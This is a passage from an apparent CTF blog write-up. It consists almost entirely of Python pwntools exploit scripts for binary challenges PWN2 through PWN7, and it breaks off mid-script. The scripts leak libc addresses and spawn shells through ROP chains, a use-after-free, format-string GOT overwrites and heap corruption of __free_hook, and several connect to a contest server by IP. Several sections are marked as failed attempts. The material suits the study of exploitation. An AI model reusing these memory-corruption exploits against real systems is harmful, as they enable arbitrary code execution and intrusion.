class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'219.219.61.234'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn2")</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context(arch="i386",os="linux")</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'\x00'</span>*<span class="number">7</span> + <span class="string">'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">put_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x80486D3</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(put_plt) + p32(main) + p32(put_got)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">print(r.recv())</span><br><span class="line">put = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">print(hex(put))</span><br><span class="line"><span class="comment">#libc = LibcSearcher('puts',put)</span></span><br><span class="line"></span><br><span class="line">libcbase = put - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">print(hex(binsh))</span><br><span class="line">sh = libcbase + binsh</span><br><span class="line">payload1 = <span class="string">b'\x00'</span>*<span class="number">7</span> + <span class="string">b'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">payload3 = <span class="string">b"A"</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN3"><a href="#PWN3" class="headerlink" title="PWN3"></a>PWN3</h2><p>UAF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("219.219.61.234",10002)</span></span><br><span class="line">r = process(<span class="string">"./pwn3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x8048986</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"AAAA"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"BBBB"</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p32(magic))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN4-fail"><a href="#PWN4-fail" class="headerlink" title="PWN4(fail)"></a>PWN4(fail)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn4'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10003'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">key = <span class="string">'3xpL0r3R'</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(str(key))</span><br><span class="line">payload = <span class="string">'aaaa%77$p'</span><span class="comment">#6</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaa0x'</span>)</span><br><span class="line">libc_base = int(int(sh.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x20840</span>)</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line">gad_get = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">one_addr = libc_base + gad_get[<span class="number">0</span>]</span><br><span class="line">log.success(hex(one_addr))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;puts_got:one_addr&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN5-fail"><a href="#PWN5-fail" class="headerlink" title="PWN5(fail)"></a>PWN5(fail)</h2><p>æ·¦ è¿™ä¸ªé¢˜æˆ‘ä»¥ä¸ºç»™çš„libcå°±èƒ½ç”¨ æ²¡æƒ³åˆ°ç”¨çš„æ˜¯æœ¬æœºçš„libcç®€ç›´è¡€äº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn5")</span></span><br><span class="line">heap = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"OK!"</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print(hex(system_addr))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#print(hex(heap.got['free']))</span></span><br><span class="line"><span class="comment">#add(0x10,"/bin/sh\x00")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN6-fail"><a href="#PWN6-fail" class="headerlink" title="PWN6(fail)"></a>PWN6(fail)</h2><p>exp1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn6'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#idx </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> <span class="comment">#sh.recvuntil('dele success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'5'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#leave message at bss</span></span><br><span class="line">sh.recvuntil(<span class="string">'secret\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">#overwrite</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x130</span>, <span class="string">'aa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>, <span class="string">'aa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'aaaaaaa'</span>)<span class="comment">#edit this to ....</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaaaaa\x0a'</span>)</span><br><span class="line"><span class="comment">#sh.recv(8)</span></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4ca8</span></span><br><span class="line">free_addr = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">malloc_addr = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#h</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)</span><br><span class="line"><span class="comment">#x/30gx 0x602120 </span></span><br><span class="line"><span class="comment">#bss_ptr</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x88</span> * <span class="string">'a'</span> + <span class="string">'\xb1'</span>)<span class="comment">#</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">'aaa'</span>)<span class="comment">#</span></span><br><span class="line">payload1 = <span class="number">0x20</span> * <span class="string">'a'</span> + <span class="string">'\x98'</span> + <span class="number">7</span> * <span class="string">'\x00'</span> + p64(free_addr)</span><br><span class="line">edit(<span class="number">8</span>,payload1)</span><br><span class="line"><span class="comment">#one_addr = libc_base + 0x45226 #0x4527a,0xf0364,0xf1207</span></span><br><span class="line">one_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload2 = p64(one_addr)</span><br><span class="line">edit(<span class="number">4</span>,payload2)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line"><span class="comment"># p = elf.process()</span></span><br><span class="line">p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line"><span class="comment"># libc = ELF('libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter</span><span class="params">()</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">"important secret"</span>,<span class="string">"ld1ng"</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendlineafter(<span class="string">'size&gt;&gt;'</span>,str(size))</span><br><span class="line"> p.sendlineafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line">enter()</span><br><span class="line">add(<span class="number">0</span>,<span class="number">128</span>,<span class="string">"aaa"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">128</span>,<span class="string">"bbb"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> -libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">info(hex(libc_base))</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">info(hex(sys))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">"ccc"</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">"ddd"</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x88</span>,<span class="string">"eee"</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xc8</span>,<span class="string">"fff"</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">16</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x88</span>)+p64(<span class="number">0x602080</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment"># add(6,0x80,"ld1ng")</span></span><br><span class="line">edit(<span class="number">3</span>,p64(sys))</span><br><span class="line"><span class="comment">#p.sendline("ls")</span></span><br><span class="line"><span class="comment">#p.sendline("cat flag")</span></span><br><span class="line"><span class="comment"># delete(4)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN7-fail"><a href="#PWN7-fail" class="headerlink" title="PWN7(fail)"></a>PWN7(fail)</h2><p>&gt;<br>&gt;<br>&gt;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./pwn7")</span></span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10050'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"1"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> 